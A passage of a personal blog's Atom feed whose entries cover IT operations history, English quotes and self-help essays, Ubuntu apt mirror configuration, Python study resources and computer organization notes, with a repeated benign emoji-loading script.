FD0;&#x7EF4;&#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BFB;&#x8005;&#x53EF;&#x4EE5;&#x5173;&#x6CE8;&#x3002;</p><p>&#x672A;&#x6765;&#x8BBE;&#x60F3;&#xFF1A;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x7684;&#x7EC8;&#x6781;&#x76EE;&#x6807; &#x65E0;&#x4EBA;&#x503C;&#x5B88;&#xFF0C;&#x7CFB;&#x7EDF;&#x5177;&#x5907;&#x6545;&#x969C;&#x81EA;&#x6108;&#x3001;&#x65E0;&#x4EBA;&#x503C;&#x5B88;&#x53D8;&#x66F4;&#x3001;&#x81EA;&#x52A8;&#x6269;&#x7F29;&#x5BB9;&#x3001;&#x81EA;&#x52A8;&#x9632;&#x5FA1;&#x7B49;&#x80FD;&#x529B;&#xFF1B;&#x5982;&#x7535;&#x5F71;&#x300A;&#x592A;&#x7A7A;&#x65C5;&#x5BA2;&#x300B;&#x4E00;&#x8258;&#x8FD0;&#x9001;&#x6570;&#x5343;&#x51AC;&#x7720;&#x4EBA;&#x5230;&#x9065;&#x8FDC;&#x6B96;&#x6C11;&#x5730;&#x661F;&#x7403;&#x7684;&#x592A;&#x7A7A;&#x98DE;&#x8239;&#xFF0C;&#x4EC5;&#x4E00;&#x4E9B;&#x673A;&#x5668;&#x4EBA;&#x8D1F;&#x8D23;&#x98DE;&#x8239;&#x7684;&#x65E5;&#x5E38;&#x7EF4;&#x62A4;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;运维岗位历史悠久&quot;&gt;&lt;a href=&quot;#运维岗位历史悠久&quot; class=&quot;headerlink&quot; title=&quot;运维岗位历史悠久&quot;&gt;&lt;/a&gt;运维岗位历史悠久&lt;/h3&gt;&lt;p&gt;提到运维很多人可能想到 IT系统的运维，其实运维岗位不仅仅最近几十年才有的工作岗位，大多运维的理念都来自人类医疗界，只不过医生是对人体这个超级复杂系统做运维，运维工程师运维的是IT系统而已。医生通过对生命以及生活的各种观察与衡量来维护生命的正常状态与运行；而运维工程师：通过对系统运行的各种观察与衡量来维护系统的正常状态与运行，如医生通过血常规、尿检等等观测指标再根据历史经验来评估一个人的身体状态，运维人员通过系统性能指标KPI变化、系统日志的根据经验找因果关系来定界定位故障；再如医生通过X射线拍CT、拍胸片来透视人体进一步观测人体细微变化来推断病因，而运维工程师则会把故障单元suspend住，放诊断器进行诊断，扫描内存堆栈等故障现场信息推到出故障根因等等，很多运维理念来至医学界。伴随科技的发展医疗诊断手段在不断演进，与医疗界一样运维也有其发展历程。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>十二句经典的爱情名言</title>
    <link href="https://marnm.github.io//posts/4c41c7ef/"/>
    <id>https://marnm.github.io//posts/4c41c7ef/</id>
    <published>2020-08-26T12:42:05.000Z</published>
    <updated>2020-08-26T12:50:54.486Z</updated>
    
    <content type="html"><![CDATA[<p>Who, being loved, is poor? &#x2014;&#x2014;Oscar Wilde</p><p>Each time you happen to me all over again. &#x2014;&#x2014;Edith Wharton</p><p>Grow old along with me! The best is yet to be. &#x2014;&#x2014;Robert Browning</p><p>Whatever our souls are made of, his and mine are the same. &#x2014;&#x2014;Emily Bronte</p><p>I love her, and that&#x2019;s the beginning and end of everything. &#x2014;&#x2014;F.Scott Shakespeare</p><p>My heart, the bird of the wilderness, has found its sky in you eyes. &#x2014;&#x2014;Tagore</p><p>You should be kissed and often, and by someone who knows how. &#x2014;&#x2014;&#x201C;Gone With the Wind&#x201D;</p><p>He was my North, my South, my East and West, My working week and my Sunday rest. &#x2014;&#x2014;W.H.Auden</p><p>In vain I have struggled. It will not do. My feelings will not be repressed. You must allow me to tell you how ardently I admire and love you. &#x2014;&#x2014;Jane Austen</p><p>Every atom of your flesh is as dear to me as my own: in pain and sickness it would still be dear. &#x2014;&#x2014;Charlotte Bronts</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Who, being loved, is poor? &amp;#x2014;&amp;#x2014;Oscar Wilde&lt;/p&gt;
&lt;p&gt;Each time you happen to me all over again. &amp;#x2014;&amp;#x2014;Edith Wharton&lt;/p
      
    
    </summary>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu修改配置及美化</title>
    <link href="https://marnm.github.io//posts/129acd64/"/>
    <id>https://marnm.github.io//posts/129acd64/</id>
    <published>2020-08-22T10:38:41.000Z</published>
    <updated>2022-09-02T19:21:41.843Z</updated>
    
    <content type="html"><![CDATA[<p>&#x8FD9;&#x91CC;&#x8BF4;&#x4E00;&#x4E9B;&#x5728;Ubuntu18.04&#x4E0B;&#x7684;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x53CA;&#x7F8E;&#x5316;</p><a id="more"></a><p>&#x5B89;&#x88C5;&#x5B8C;&#x7CFB;&#x7EDF;&#x540E;&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x955C;&#x50CF;&#x6E90;&#xFF0C;&#x6539;&#x6210;&#x56FD;&#x5185;&#x7684;&#xFF1A;</p><p>&#x5907;&#x4EFD;</p><pre><code class="bash">sudo mv /etc/apt/source.list /etc/apt/source.list.backup</code></pre><p>&#x963F;&#x91CC;&#x4E91;&#x7684;Ubuntu18.04&#x6E90;&#xFF1A;</p><pre><code class="bash">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</code></pre><p>&#x6E05;&#x534E;&#x7684;18.04&#x955C;&#x50CF;&#x6E90;&#xFF1A;</p><pre><code class="bash"># &#x9ED8;&#x8BA4;&#x6CE8;&#x91CA;&#x4E86;&#x6E90;&#x7801;&#x955C;&#x50CF;&#x4EE5;&#x63D0;&#x9AD8; apt update &#x901F;&#x5EA6;&#xFF0C;&#x5982;&#x6709;&#x9700;&#x8981;&#x53EF;&#x81EA;&#x884C;&#x53D6;&#x6D88;&#x6CE8;&#x91CA;deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse# &#x9884;&#x53D1;&#x5E03;&#x8F6F;&#x4EF6;&#x6E90;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x542F;&#x7528;# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里说一些在Ubuntu18.04下的基本配置及美化&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>你要懂得及时止损，别太在乎沉没成本</title>
    <link href="https://marnm.github.io//posts/bb750036/"/>
    <id>https://marnm.github.io//posts/bb750036/</id>
    <published>2020-08-21T14:57:52.000Z</published>
    <updated>2022-05-26T13:50:48.640Z</updated>
    
    <content type="html"><![CDATA[<h3 id="How-to-Tell-That-It&#x2019;s-Time-to-Quit"><a href="#How-to-Tell-That-It&#x2019;s-Time-to-Quit" class="headerlink" title="How to Tell That It&#x2019;s Time to Quit"></a>How to Tell That It&#x2019;s Time to Quit</h3><blockquote><p>&#x5982;&#x4F55;&#x8FA8;&#x8BA4;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8BE5;&#x653E;&#x5F03;</p></blockquote><p>Quitting is usually perceived to be negative, whereas perseverance is seen as admirable and even essential for success in life.</p><p>Surprisingly, though, when perseverance is taken too far, it becomes self-destructive. Research shows that people who let go of unattainable goals experience higher well-being. So why is it so hard to surrender?</p><a id="more"></a><p>Here is the one thing to consider in order to celebrate &#x201C;failure&#x201D;: We may be biased against quitting because we are trapped in the &#x201C;sunk cost fallacy.(&#x6C89;&#x6CA1;&#x6210;&#x672C;&#x8BEF;&#x8C2C;)&#x201D;</p><p>In economics, sunk costs are those past cost that has already been paid and cannot be recovered. They represent the time and effort already spent on a project.</p><p>Let&#x2019;s say you buy tickets to a concert. On the day of the event, you catch a cold. Even though you are sick, you decide to go to the concert because otherwise &#x201C;you would have wasted your money&#x201D;.</p><p>Boom! You just fell for the &#x201C;sunk cost fallacy.&#x201D;</p><p>Sure, you spent the money already. But you can&#x2019;t get it back. If you aren&#x2019;t going to have a good time at the concert, you only make your life worse by going.</p><p>Everyone experiences the influence of sunk costs in some form or another, whether through the investment of time or money in projects or doomed relationships. It is hard to let go. And while we know it&#x2019;s common, the sunk cost fallacy may also be more dangerous than we realize.</p><p>Holding on to a current subpar opportunity hinders the potential for one&#x2019;s future. To help you let go of sunk-cost thinking, economics recommend instead considering opportunity cost. Whereas a sunk cost is about the past, opportunity cost is about the future.</p><p>In a world of finite resources, every dollar you spend on one thing is not spent elsewhere. Held back by yesterday&#x2019;s projects, you cannot solve future problems. Letting go, then, and ending the continued investment of time, money, or energy in one direction offers us practical and mental freedom to advance in another, more promising area.</p><p>Those who quit dead-end endeavors are mentally healthier than those who stay entrapped, as people trapped by dead-end goals may begin to experience negative effects like anxiety and diminished well-being.</p><p>When we are overly focused on a particular goal or outcome, we become rigid and inflexible. This narrows our options and makes us feel more limited. Use your time and resources more effectively: Do not be afraid to give up frustrating goals. New opportunities will be just around the corner.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;How-to-Tell-That-It’s-Time-to-Quit&quot;&gt;&lt;a href=&quot;#How-to-Tell-That-It’s-Time-to-Quit&quot; class=&quot;headerlink&quot; title=&quot;How to Tell That It’s Time to Quit&quot;&gt;&lt;/a&gt;How to Tell That It’s Time to Quit&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;如何辨认什么时候该放弃&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Quitting is usually perceived to be negative, whereas perseverance is seen as admirable and even essential for success in life.&lt;/p&gt;
&lt;p&gt;Surprisingly, though, when perseverance is taken too far, it becomes self-destructive. Research shows that people who let go of unattainable goals experience higher well-being. So why is it so hard to surrender?&lt;/p&gt;
    
    </summary>
    
      <category term="英语" scheme="https://marnm.github.io/categories/%E8%8B%B1%E8%AF%AD/"/>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>诺尔·巴尔扎克（Honoréde Balzac）的名言</title>
    <link href="https://marnm.github.io//posts/51acad32/"/>
    <id>https://marnm.github.io//posts/51acad32/</id>
    <published>2020-08-19T14:32:17.000Z</published>
    <updated>2020-08-19T15:05:40.527Z</updated>
    
    <content type="html"><![CDATA[<p>Honor&#xE9;de de Balzac was a novelist and playwright in nineteenth-century France. Among his most successful works were La Duchesse de La Duchesse de Langeais, Eugenie Grandet, and Pere Goriot, La Comedie Humaine.</p><p>The greatest legacy Honor&#xE9;de Balzac left behind was the use of realism in the novel.  The structure of his novels, in which the plot is presented in sequential order by an omniscient narrator and one event causes another, was influential for many later writers. Literary scholars have also focused on his exploration of the links between social standing and character development, as well as a belief in the strength of the human spirit that has endured to this day.</p><p>In commemoration of the 170th anniversary of the death of Honor&#xE9;de de Balzac, we some quotes from his works.</p><a id="more"></a><p>Love is the poetry of the senses. <code>&#x7231;&#x662F;&#x611F;&#x5B98;&#x7684;&#x8BD7;&#x6B4C;</code></p><p>Vanity is only to be satisfied by gold in floods. <code>&#x865A;&#x8363;&#x5FC3;&#x7531;&#x6CDB;&#x6EE5;&#x7684;&#x91D1;&#x94B1;&#x6765;&#x586B;&#x8865;</code></p><p>Excess of joy is harder to bear than any amount of sorrow.<code>&#x8FC7;&#x5EA6;&#x7684;&#x6B22;&#x4E50;&#x6BD4;&#x4EFB;&#x4F55;&#x7A0B;&#x5EA6;&#x7684;&#x60B2;&#x4F24;&#x90FD;&#x96BE;&#x53D7;</code></p><p>The most natural feelings are those we are least willing to confess.<code>&#x6700;&#x81EA;&#x7136;&#x7684;&#x611F;&#x89C9;&#x662F;&#x6211;&#x4EEC;&#x6700;&#x4E0D;&#x613F;&#x627F;&#x8BA4;&#x7684;&#x611F;&#x89C9;</code></p><p>All poetry, like every work of art, proceeds from a swift vision of things.</p><p>The heart of a mother is a deep abyss at the bottom of which you will always find forgiveness.</p><p>People exaggerate both happiness and unhappiness; we are never so fortunate nor so unfortunate as people say we are.</p><p>Such is life. It is no cleaner than a kitchen; it reeks like a kitchen; and if you mean to cook your dinner, you must expect to soil your hands; the real art is in getting them clean again, and therein lies the whole morality of our epoch.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Honoréde de Balzac was a novelist and playwright in nineteenth-century France. Among his most successful works were La Duchesse de La Duchesse de Langeais, Eugenie Grandet, and Pere Goriot, La Comedie Humaine.&lt;/p&gt;
&lt;p&gt;The greatest legacy Honoréde Balzac left behind was the use of realism in the novel.  The structure of his novels, in which the plot is presented in sequential order by an omniscient narrator and one event causes another, was influential for many later writers. Literary scholars have also focused on his exploration of the links between social standing and character development, as well as a belief in the strength of the human spirit that has endured to this day.&lt;/p&gt;
&lt;p&gt;In commemoration of the 170th anniversary of the death of Honoréde de Balzac, we some quotes from his works.&lt;/p&gt;
    
    </summary>
    
      <category term="英语" scheme="https://marnm.github.io/categories/%E8%8B%B1%E8%AF%AD/"/>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>In Your 20&#39;s These Things Matter More Than You Think</title>
    <link href="https://marnm.github.io//posts/4def9c28/"/>
    <id>https://marnm.github.io//posts/4def9c28/</id>
    <published>2020-08-18T12:54:13.000Z</published>
    <updated>2020-08-18T13:30:21.445Z</updated>
    
    <content type="html"><![CDATA[<p>In my twenties, I had no idea what would matter long term. I&#x2019;m a smart person, but I didn&#x2019;t think much about my future. I lived moment to moment, without much thought or planning. Instead, I put my energy into what I thought mattered at the time. Getting good grades, dating, friends, going out to bars, and my appearance were top of the list.</p><a id="more"></a><p>Now, at 41, with the benefit of hindsight, I can see that some of my decisions mattered a lot. If I could go back and do my twenties again, I&#x2019;d use my energy in quite a different way.</p><p>Here are some things that are more important long-term that I realized:</p><p><strong>Developing you marketable skills</strong></p><p>I was accepted into two amazing Master&#x2019;s programs. The topics were exciting, but I turned them both down for a teaching position. I&#x2019;d already spent 5 years at university and if felt irresponsible studying for so long. I&#x2019;ll do my Masters later, I thought. I should probably be an adult and take this job.</p><p>What I didn&#x2019;t realize is how much harder it is to study later in life. I know people who are studying while parenting and working, but it&#x2019;s tough. Life gets busier and more complex.</p><p>Not everyone needs to get a degree, of course, but the world is competitive. Getting the highest level of education you are able to (and want to) can give you an advantage Having a tertiary education or specialized training makes it easier to get work later, and the jobs available to you are often more interesting, creative, and satisfying.</p><p><strong>Spending your time wisely</strong></p><p>I spent a lot of energy in my early 20&#x2019;s on relationships that I knew were going nowhere. Most of my free time was taken up by my boyfriends &#x2014;&#x2014; time I could have spent exploring hobbies, going on adventures with friends, meeting new people, and pursuing my own interests.</p><p>I knew early on I wasn&#x2019;t going to marry these guys. The time I invested in those relationships was mostly wasted. Instead of keeping my boyfriends happy, I could have used that time to work on becoming the person I wanted to be.</p><p>That&#x2019;s one of your main jobs in this time of life. In my 20&#x2019;s I thought I&#x2019;d just &#x201C;find myself&#x201D; but it doesn&#x2019;t work like that. What I&#x2019;ve realized is you don&#x2019;t find yourself, you create yourself. You decide who you want to be, what kind of life you want, and create that for yourself.</p><p><strong>Saying yes or no to love</strong></p><p>Learning what makes a good relationship matters. At 23, I got engaged after six months of dating. Looking back, I barely knew my ex, but it didn&#x2019;t feel like it mattered. It felt romantic and intense. It felt like the next logical stage in my life &#x2014;&#x2014; mid twenties, get married, have kids, get a house&#x2026;</p><p>I didn&#x2019;t know about stages of love, red flags, toxic patterns of communication, how to deal with conflict well, chemistry and compatibility, or how to make a marriage work. I was very green and it mattered more than I realized. </p><p>Who you choose to say &#x201C;yes&#x201D; to makes a huge impact on your life for many years. Arm yourself with knowledge to choose well.</p><p><strong>Facing your demons</strong></p><p>Like many young people, I had issues left over from childhood that I didn&#x2019;t want to face. I thought I was doing what was best: forget it and move on! But by not dealing with my past, I made life harder for myself that it needed to be.</p><p>Not dealing with my problems had consequences. In my social life and relationships it meant I worked to hard to please people. In my work and study, it meant I pushed myself to exhaustion.</p><p>It wasn&#x2019;t until a few years ago that I realized how important it is to deal with and take responsibility for your own issues. Ignoring your past issues can leave you vulnerable to depression, anxiety, low self-worth, and low self-awareness.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;In my twenties, I had no idea what would matter long term. I’m a smart person, but I didn’t think much about my future. I lived moment to moment, without much thought or planning. Instead, I put my energy into what I thought mattered at the time. Getting good grades, dating, friends, going out to bars, and my appearance were top of the list.&lt;/p&gt;
    
    </summary>
    
      <category term="英语" scheme="https://marnm.github.io/categories/%E8%8B%B1%E8%AF%AD/"/>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>Python学习笔记</title>
    <link href="https://marnm.github.io//posts/297a89d9/"/>
    <id>https://marnm.github.io//posts/297a89d9/</id>
    <published>2020-04-09T13:47:40.000Z</published>
    <updated>2022-05-26T13:39:52.960Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x5B89;&#x88C5;"><a href="#&#x5B89;&#x88C5;" class="headerlink" title="&#x5B89;&#x88C5;"></a>&#x5B89;&#x88C5;</h3><p>&#x76F4;&#x63A5;&#x53BB;<a href="https://www.python.org/downloads/" target="_blank" rel="noopener">&#x5B98;&#x7F51;</a>&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5C31;&#x884C;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4ECB;&#x7ECD;&#x5B89;&#x88C5;&#x6B65;&#x9AA4;&#x4E86;&#x3002;<br><a id="more"></a></p><h3 id="&#x63A8;&#x8350;&#x4E66;&#x5355;"><a href="#&#x63A8;&#x8350;&#x4E66;&#x5355;" class="headerlink" title="&#x63A8;&#x8350;&#x4E66;&#x5355;"></a>&#x63A8;&#x8350;&#x4E66;&#x5355;</h3><p>&#x300A;&#x7B80;&#x660E;Python&#x6559;&#x7A0B;&#x300B;<a href="https://python.swaroopch.com/" target="_blank" rel="noopener">https://python.swaroopch.com/</a></p><p>Python&#x7F16;&#x7801;&#x89C4;&#x8303;&#xFF08;&#x5B98;&#x65B9;&#xFF09;<a href="https://peps.python.org/pep-0008/" target="_blank" rel="noopener">https://peps.python.org/pep-0008/</a></p><p>&#x300A;Python&#x6838;&#x5FC3;&#x7F16;&#x7A0B;&#x300B;[&#x7F8E;] Wesley Chun</p><p>&#x300A;Python&#x6A21;&#x5757;&#x8BE6;&#x89E3;&#x300B;<a href="https://code.google.com/archive/p/pymotwcn/" target="_blank" rel="noopener">Google Code Archive - Long-term storage for Google Code Project Hosting.</a></p><h3 id="&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;"><a href="#&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;" class="headerlink" title="&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;"></a>&#x9009;&#x62E9;&#x4E00;&#x4E2A;&#x65B9;&#x5411;</h3><p>Python&#x80FD;&#x505A;&#x7684;&#x4E8B;&#x592A;&#x591A;&#x4E86;&#xFF0C;&#x4E00;&#x4E9B;&#x6BD4;&#x8F83;&#x70ED;&#x95E8;&#x7684;&#x9886;&#x57DF;</p><ul><li style="list-style: none"><input type="checkbox"> &#x722C;&#x866B;</li><li style="list-style: none"><input type="checkbox"> &#x5927;&#x6570;&#x636E;&#x5206;&#x6790;</li><li style="list-style: none"><input type="checkbox"> &#x81EA;&#x52A8;&#x5316;&#x6D4B;&#x8BD5;</li><li style="list-style: none"><input type="checkbox"> &#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;</li><li style="list-style: none"><input type="checkbox"> &#x4EBA;&#x5DE5;&#x667A;&#x80FD;</li><li style="list-style: none"><input type="checkbox"> &#x6DF1;&#x5EA6;&#x5B66;&#x4E60;</li><li style="list-style: none"><input type="checkbox"> &#x673A;&#x5668;&#x5B66;&#x4E60;</li><li style="list-style: none"><input type="checkbox"> &#x56FE;&#x50CF;&#x5904;&#x7406;</li><li style="list-style: none"><input type="checkbox"> &#x56FE;&#x50CF;&#x8BC6;&#x522B;</li><li style="list-style: none"><input type="checkbox"> &#x81EA;&#x52A8;&#x5316;&#x529E;&#x516C;</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;直接去&lt;a href=&quot;https://www.python.org/downloads/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官网&lt;/a&gt;下载安装就行了，这里就介绍安装步骤了。&lt;br&gt;
    
    </summary>
    
    
      <category term="Python" scheme="https://marnm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>计算机组成原理</title>
    <link href="https://marnm.github.io//posts/8d4b7ae1/"/>
    <id>https://marnm.github.io//posts/8d4b7ae1/</id>
    <published>2020-02-14T12:52:36.000Z</published>
    <updated>2022-05-27T01:37:36.444Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>2.14&#xFF0C;&#x53BB;**&#x7684;&#x60C5;&#x4EBA;&#x8282;&#xFF0C;&#x8FD8;&#x662F;&#x7535;&#x8111;&#x597D;&#x73A9;</p><p>&#x6211;&#x5410;&#x4E86;&#xFF0C;&#x7EC4;&#x6210;&#x539F;&#x7406;&#x771F;&#x662F;&#x5927;&#x5B66;&#x6700;&#x75DB;&#x82E6;&#x7684;&#x8BFE;&#x7A0B;&#x4E4B;&#x4E00;&#xFF0C;&#x592A;&#x96BE;&#x4E86;o(&#x2565;&#xFE4F;&#x2565;)o</p></blockquote><p>&#x8BA1;&#x7B97;&#x673A;&#x7EC4;&#x6210;</p><p>&#x4E00;  &#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x6982;&#x8BBA;<br><a id="more"></a><br>&#x786C;&#x4EF6;&#xFF1A;&#x8BA1;&#x7B97;&#x673A;&#x7684;&#x5B9E;&#x4F53;&#xFF0C;&#x5982;&#x4E3B;&#x673A;&#xFF0C;&#x5916;&#x8BBE;&#x7B49;</p><p>&#x8F6F;&#x4EF6;&#xFF1A;&#x5177;&#x6709;&#x5404;&#x7C7B;&#x7279;&#x6B8A;&#x529F;&#x80FD;&#x7684;&#x4FE1;&#x606F;&#xFF08;&#x7A0B;&#x5E8F;&#xFF09;&#x7EC4;&#x6210;</p><table><thead><tr><th>&#x8F6F;&#x4EF6;&#x7C7B;&#x578B;</th><th>&#x5B9A;&#x4E49;</th><th>&#x4E3E;&#x4F8B;</th></tr></thead><tbody><tr><td>&#x7CFB;&#x7EDF;&#x8F6F;&#x4EF6;</td><td>&#x7528;&#x6765;&#x7BA1;&#x7406;&#x6574;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;</td><td>&#x6807;&#x51C6;&#x7A0B;&#x5E8F;&#x5E93;&#xFF0C;&#x8BED;&#x8A00;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#xFF0C;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF0C;&#x7F51;&#x7EDC;&#x8F6F;&#x4EF6;</td></tr><tr><td>&#x5E94;&#x7528;&#x8F6F;&#x4EF6;</td><td>&#x6309;&#x4EFB;&#x52A1;&#x9700;&#x8981;&#x7F16;&#x5236;&#x6210;&#x7684;&#x5404;&#x79CD;&#x7A0B;&#x5E8F;</td><td>&#x79D1;&#x5B66;&#x8BA1;&#x7B97;&#x7A0B;&#x5E8F;&#xFF0C;&#x6570;&#x636E;&#x5904;&#x7406;&#x7A0B;&#x5E8F;&#xFF0C;&#x8FC7;&#x7A0B;&#x63A7;&#x5236;&#x7A0B;&#x5E8F;&#xFF0C;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x7A0B;&#x5E8F;</td></tr></tbody></table><p>&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x5C42;&#x6B21;&#x7ED3;&#x6784;</p><p>&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;</p><table><thead><tr><th>&#x5206;&#x7C7B;</th><th>&#x533A;&#x522B;</th><th>&#x5B9A;&#x4E49;</th></tr></thead><tbody><tr><td>&#x8BA1;&#x7B97;&#x673A;&#x4F53;&#x7CFB;&#x7ED3;&#x6784;</td><td>&#x6709;&#x65E0;&#x4E58;&#x6CD5;&#x6307;&#x4EE4;</td><td>&#x7A0B;&#x5E8F;&#x5458;&#x89C1;&#x5230;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;&#x7684;&#x5C5E;&#x6027;&#xFF0C;&#x5373;&#x6982;&#x5FF5;&#x6027;&#x7684;&#x7ED3;&#x6784;&#x548C;&#x529F;&#x80FD;&#x7279;&#x6027;&#xFF08;&#x6307;&#x4EE4;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x5BFB;&#x5740;&#x6280;&#x672F;&#xFF0C;I/O&#x673A;&#x7406;&#xFF09;</td></tr><tr><td>&#x8BA1;&#x7B97;&#x673A;&#x7EC4;&#x6210;</td><td>&#x5982;&#x4F55;&#x5B9E;&#x